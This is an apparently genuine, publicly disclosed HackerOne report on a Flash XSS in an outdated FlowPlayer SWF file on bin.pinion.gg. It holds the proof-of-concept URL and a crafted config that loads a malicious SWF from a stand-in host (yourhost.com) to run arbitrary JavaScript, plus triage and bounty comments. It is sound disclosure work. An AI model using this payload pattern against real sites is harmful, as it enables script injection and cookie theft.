{"id":254269,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC8yNTQyNjk=","url":"https://hackerone.com/reports/254269","title":"Persistent XSS found on bin.pinion.gg due to outdated FlowPlayer SWF file with Remote File Inclusion vulnerability.","state":"Closed","substate":"resolved","severity_rating":"low","readable_substate":"Resolved","created_at":"2017-07-28T13:50:32.637Z","submitted_at":"2017-07-28T13:50:32.637Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"sp1d3rs","url":"/sp1d3rs","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a"},"is_me?":false,"cleared":true,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":2672,"url":"https://hackerone.com/unikrn","handle":"unikrn","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Unikrn","twitter_handle":"unikrnco","website":"https://unikrn.com","about":"Win prizes, bet safely and legally on esports and get the best multi-title coverage for fans and fanatics alike!"}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2017-10-05T21:10:12.774Z","bug_reporter_agreed_on_going_public_at":"2017-10-05T20:43:56.211Z","team_member_agreed_on_going_public_at":"2017-10-05T21:10:12.715Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"##Description\nHi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.\nI discovered an interesting file on http://templ4d2.pinion.gg/motd2.manifest with next content:\n```\nCACHE MANIFEST\n# 2014-07-07\nCACHE:\nhttp://bin.pinion.gg/bin/companions.min.js\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nhttp://vox-static.liverail.com/crossdomain.xml\nhttp://cdn-static.liverail.com/crossdomain.xml\nhttp://bs.serving-sys.com/crossdomain.xml\nhttp://ad-apac.doubleclick.net/crossdomain.xml\nhttp://ads.intergi.com/crossdomain.xml\nhttp://u-ads.adap.tv/crossdomain.xml\nhttp://imasdk.googleapis.com/js/sdkloader/ima3.js\nhttp://www.googletagservices.com/tag/js/gpt.js\nhttps://www.google-analytics.com/ga.js\nhttp://partner.googleadservices.com/gpt/pubads_impl_90.js\nNETWORK:\n*\n```\n\nOne string attracted my attention - http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nI submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (https://github.com/flowplayer/), vulnerable to XSS through remote file inclusion.\n\n##POC\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://████████/test.js\nJust visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.\n\n##Impact\nThe vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.\n1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content\n2) Using Open Redirect through `window.location` js payload.\n3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.\n4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.\n\n##Reproduction steps\nYou just need to place the malicious file to the remote host, like in this example:\nhttp://████/test.js\nand append the url to the\n```\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=\n```\nas parameter.\n\n##Suggested fix\nI recommend you to update FlowPlayer to the latest version, or remove if not used.","vulnerability_information_html":"\u003ch2 id=\"description\"\u003eDescription\u003c/h2\u003e\n\n\u003cp\u003eHi. Today i looked to some outscope subdomains *.pinion.gg for recon purposes.\u003cbr\u003e\nI discovered an interesting file on \u003ca title=\"http://templ4d2.pinion.gg/motd2.manifest\" href=\"/redirect?url=http%3A%2F%2Ftempl4d2.pinion.gg%2Fmotd2.manifest\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://templ4d2.pinion.gg/motd2.manifest\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e with next content:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eCACHE MANIFEST\n# 2014-07-07\nCACHE:\nhttp://bin.pinion.gg/bin/companions.min.js\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\nhttp://vox-static.liverail.com/crossdomain.xml\nhttp://cdn-static.liverail.com/crossdomain.xml\nhttp://bs.serving-sys.com/crossdomain.xml\nhttp://ad-apac.doubleclick.net/crossdomain.xml\nhttp://ads.intergi.com/crossdomain.xml\nhttp://u-ads.adap.tv/crossdomain.xml\nhttp://imasdk.googleapis.com/js/sdkloader/ima3.js\nhttp://www.googletagservices.com/tag/js/gpt.js\nhttps://www.google-analytics.com/ga.js\nhttp://partner.googleadservices.com/gpt/pubads_impl_90.js\nNETWORK:\n*\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eOne string attracted my attention - \u003ca title=\"http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\" href=\"/redirect?url=http%3A%2F%2Fbin.pinion.gg%2Fbin%2Fflowplayer.commercial-3.2.15.swf\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nI submitted previously some vulnerabilities connected with this file to other programs, so easily determined that it is an outdated version of FlowPlayer (\u003ca title=\"https://github.com/flowplayer/\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fflowplayer%2F\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/flowplayer/\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e), vulnerable to XSS through remote file inclusion.\u003c/p\u003e\n\n\u003ch2 id=\"poc\"\u003ePOC\u003c/h2\u003e\n\n\u003cp\u003e\u003ca title=\"http://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88/test.js\" href=\"/redirect?url=http%3A%2F%2Fbin.pinion.gg%2Fbin%2Fflowplayer.commercial-3.2.15.swf%3Fconfig%3Dhttp%3A%2F%2F%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%25E2%2596%2588%2Ftest.js\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88%E2%96%88/test.js\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003cbr\u003e\nJust visit this link. Player will load my remote .js file from the my host, and display few popups with document.cookie and document.domain payloads.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThe vulnerable file is hosted on out-scope subdomain, so i thinked, how it can affect security of main domains.\u003cbr\u003e\n1) Using bin.pinion.gg deface. Because attacker can execute any JS, he can deface the page by arbitrary content\u003cbr\u003e\n2) Using Open Redirect through \u003ccode\u003ewindow.location\u003c/code\u003e js payload.\u003cbr\u003e\n3) Using setting cookie cross-domain. In this case the attacker can set arbitrary cookies to the pinion.gg or cp-ng.pinion.gg.\u003cbr\u003e\n4) If this file is used in some instance to display some content, ads, etc. - then the instance is vulnerable to XSS.\u003c/p\u003e\n\n\u003ch2 id=\"reproduction-steps\"\u003eReproduction steps\u003c/h2\u003e\n\n\u003cp\u003eYou just need to place the malicious file to the remote host, like in this example:\u003cbr\u003e\nhttp://████/test.js\u003cbr\u003e\nand append the url to the\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eas parameter.\u003c/p\u003e\n\n\u003ch2 id=\"suggested-fix\"\u003eSuggested fix\u003c/h2\u003e\n\n\u003cp\u003eI recommend you to update FlowPlayer to the latest version, or remove if not used.\u003c/p\u003e\n","bounty_amount":"30.0","formatted_bounty":"$30","weakness":{"id":60,"name":"Cross-site Scripting (XSS) - Generic"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2017-11-04T20:43:56.278Z","allow_singular_disclosure_after":-99390537.60747252,"singular_disclosure_allowed":true,"vote_count":17,"voters":["jensec","europa","fa1rlight","asad0x01_","eveeez","apapedulimu","mr_r3boot","ak1t4","whitesector","japz","and 7 more..."],"severity":{"rating":"low","author_type":"Team"},"structured_scope":{"databaseId":455,"asset_type":"URL","asset_identifier":"pinion.gg","max_severity":"medium"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":1873378,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'll try to look tha latest version","markdown_message":"\u003cp\u003eI\u0026#39;ll try to look tha latest version\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-28T14:10:54.377Z","updated_at":"2017-07-28T14:20:14.634Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1873431,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"It looks like https://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip is a most up-to-date version.\nAlso you can deal with this bug without updating the SWF library, by disallowing the external hosts in the config param of GET request using server rules.\n\nIf you consider this as accepted risk, let me know please, ill close the ticket.","markdown_message":"\u003cp\u003eIt looks like \u003ca title=\"https://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip\" href=\"/redirect?url=https%3A%2F%2Freleases.flowplayer.org%2F7.0.4%2Fflowplayer-7.0.4.zip\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://releases.flowplayer.org/7.0.4/flowplayer-7.0.4.zip\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is a most up-to-date version.\u003cbr\u003e\nAlso you can deal with this bug without updating the SWF library, by disallowing the external hosts in the config param of GET request using server rules.\u003c/p\u003e\n\n\u003cp\u003eIf you consider this as accepted risk, let me know please, ill close the ticket.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-07-28T14:32:13.548Z","updated_at":"2017-07-28T14:33:42.811Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":1881909,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"thx - not super hight prio for us - but we will look into it.","markdown_message":"\u003cp\u003ethx - not super hight prio for us - but we will look into it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-01T10:25:58.649Z","updated_at":"2017-08-01T10:25:58.649Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1892115,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"thx again for this report! We are exploring options how risky a fix is atm.","markdown_message":"\u003cp\u003ethx again for this report! We are exploring options how risky a fix is atm.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-04T03:56:30.787Z","updated_at":"2017-08-04T03:56:30.787Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1892884,"is_internal":false,"editable":false,"type":"Activities::ReportSeverityUpdated","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-04T13:16:50.756Z","updated_at":"2017-08-04T13:16:50.756Z","additional_data":{"old_severity":"Medium","new_severity":"Low","old_severity_id":62825,"new_severity_id":65107},"actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1935876,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"update: we are on it ;)","markdown_message":"\u003cp\u003eupdate: we are on it ;)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-17T12:40:02.674Z","updated_at":"2017-08-17T12:40:02.674Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1935877,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"","markdown_message":"","automated_response":false,"created_at":"2017-08-17T12:40:12.766Z","updated_at":"2017-08-17T12:40:12.766Z","actor":{"url":"/unikrn","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/002/672/c6c2b32746235b372285a9047457642b7b9bc6a1_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"profile":{"name":"Unikrn"}},"bounty_amount":"30.0","bounty_currency":"usd","bonus_amount":"0.0","genius_execution_id":null,"team_handle":"unikrn","collaborator":{"username":"sp1d3rs","url":"/sp1d3rs"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":1935937,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks for the bounty:)","markdown_message":"\u003cp\u003eThanks for the bounty:)\u003c/p\u003e\n","automated_response":false,"created_at":"2017-08-17T13:04:49.055Z","updated_at":"2017-08-17T13:04:49.055Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2047478,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"took a while .. ;) ","markdown_message":"\u003cp\u003etook a while .. ;) \u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T19:41:37.293Z","updated_at":"2017-10-05T19:41:37.293Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"reporter":{"username":"sp1d3rs","url":"/sp1d3rs"},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047587,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Great:)\nCan you hide the hostname `██████` please?\nAfter this we can disclose it.","markdown_message":"\u003cp\u003eGreat:)\u003cbr\u003e\nCan you hide the hostname \u003ccode\u003e██████\u003c/code\u003e please?\u003cbr\u003e\nAfter this we can disclose it.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T20:19:53.467Z","updated_at":"2017-10-05T20:35:14.956Z","actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2047631,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Done.","markdown_message":"\u003cp\u003eDone.\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T20:35:35.333Z","updated_at":"2017-10-05T20:35:35.333Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047651,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Thanks a lot!","markdown_message":"\u003cp\u003eThanks a lot!\u003c/p\u003e\n","automated_response":false,"created_at":"2017-10-05T20:43:56.241Z","updated_at":"2017-10-05T20:43:56.241Z","first_to_agree":true,"actor":{"username":"sp1d3rs","cleared":true,"url":"/sp1d3rs","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/079/690/6853ada3e124bdd8616b1be752223b558de38195_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":2047698,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T21:10:12.739Z","updated_at":"2017-10-05T21:10:12.739Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":2047699,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","markdown_message":"","automated_response":false,"created_at":"2017-10-05T21:10:12.801Z","updated_at":"2017-10-05T21:10:12.801Z","actor":{"username":"decrypted","cleared":false,"url":"/decrypted","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/819/849ab6e942d0608e17e1c98244b240363a4ad9b7_original.png/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"unikrn","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"id":5490,"category":"researcher","content":"*Thanks to the Unikrn team for the fast response, fix, and the bounty!*\n\nI discovered the Flash XSS issue on the one of the pinion.gg subdomains.\nThe XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it `test.js`), placed on remote host, and then referenced in `config` URL param:\n```\n{\n    'log' : {\n        'level'  : 'info'\n    },\n    'clip': {\n        'autoPlay': 'true',\n        'baseUrl': 'http://stream.flowplayer.org/',\n        'onMyConnectionEvent': 'function(clip, info) {alert(/onMyConnectionEvent/)};',\n        'onStart': 'function() {alert(/onBegin/);}' \n    },\n    'playlist': [ \n    ],\n    'plugins': { \n        'controls': { \n            'url': 'http://yourhost.com/xss.swf' \n        }\n    },\n    'onLoad': 'function() {alert(/onLoad/);}',\n    'connectionCallbacks': [ \"onMyConnectionEvent\" ]\n}\n```\nwhere `http://yourhost.com/xss.swf` - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.\nUsing \n```\nhttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js\n```\nit was possible to execute any arbitrary JS in the context of subdomain.\nI named it as persistent in the report title, because payload was in the stored form, but just 'flash xss' sounds more correctly. It could be turned to persistent, in case that `config` param actually was used somewhere.\n\n\n##References\n* https://github.com/flowplayer/flash/issues/263\n* http://mihai.bazon.net/blog/externalinterface-is-unreliable","can_view?":true,"can_edit?":false,"content_html":"\u003cp\u003e\u003cem\u003eThanks to the Unikrn team for the fast response, fix, and the bounty!\u003c/em\u003e\u003c/p\u003e\n\n\u003cp\u003eI discovered the Flash XSS issue on the one of the pinion.gg subdomains.\u003cbr\u003e\nThe XSS issue was in the outdated FlowPlayer SWF file (which suffered from some ExternalInterface.Call/clientside RFI-related issues), and was exploitable using next JS (we can call it \u003ccode\u003etest.js\u003c/code\u003e), placed on remote host, and then referenced in \u003ccode\u003econfig\u003c/code\u003e URL param:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e{\n    \u0026#39;log\u0026#39; : {\n        \u0026#39;level\u0026#39;  : \u0026#39;info\u0026#39;\n    },\n    \u0026#39;clip\u0026#39;: {\n        \u0026#39;autoPlay\u0026#39;: \u0026#39;true\u0026#39;,\n        \u0026#39;baseUrl\u0026#39;: \u0026#39;http://stream.flowplayer.org/\u0026#39;,\n        \u0026#39;onMyConnectionEvent\u0026#39;: \u0026#39;function(clip, info) {alert(/onMyConnectionEvent/)};\u0026#39;,\n        \u0026#39;onStart\u0026#39;: \u0026#39;function() {alert(/onBegin/);}\u0026#39; \n    },\n    \u0026#39;playlist\u0026#39;: [ \n    ],\n    \u0026#39;plugins\u0026#39;: { \n        \u0026#39;controls\u0026#39;: { \n            \u0026#39;url\u0026#39;: \u0026#39;http://yourhost.com/xss.swf\u0026#39; \n        }\n    },\n    \u0026#39;onLoad\u0026#39;: \u0026#39;function() {alert(/onLoad/);}\u0026#39;,\n    \u0026#39;connectionCallbacks\u0026#39;: [ \u0026quot;onMyConnectionEvent\u0026quot; ]\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003ewhere \u003ccode\u003ehttp://yourhost.com/xss.swf\u003c/code\u003e - it is specially crafted SWF file, which execute arbitrary JS through ExternalInterface.Call method.\u003cbr\u003e\nUsing \u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003ehttp://bin.pinion.gg/bin/flowplayer.commercial-3.2.15.swf?config=http://[redacted.com]/test.js\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eit was possible to execute any arbitrary JS in the context of subdomain.\u003cbr\u003e\nI named it as persistent in the report title, because payload was in the stored form, but just \u0026#39;flash xss\u0026#39; sounds more correctly. It could be turned to persistent, in case that \u003ccode\u003econfig\u003c/code\u003e param actually was used somewhere.\u003c/p\u003e\n\n\u003ch2 id=\"references\"\u003eReferences\u003c/h2\u003e\n\n\u003cul\u003e\n\u003cli\u003e\u003ca title=\"https://github.com/flowplayer/flash/issues/263\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fflowplayer%2Fflash%2Fissues%2F263\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/flowplayer/flash/issues/263\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003ca title=\"http://mihai.bazon.net/blog/externalinterface-is-unreliable\" href=\"/redirect?url=http%3A%2F%2Fmihai.bazon.net%2Fblog%2Fexternalinterface-is-unreliable\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttp://mihai.bazon.net/blog/externalinterface-is-unreliable\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/li\u003e\n\u003c/ul\u003e\n"}]}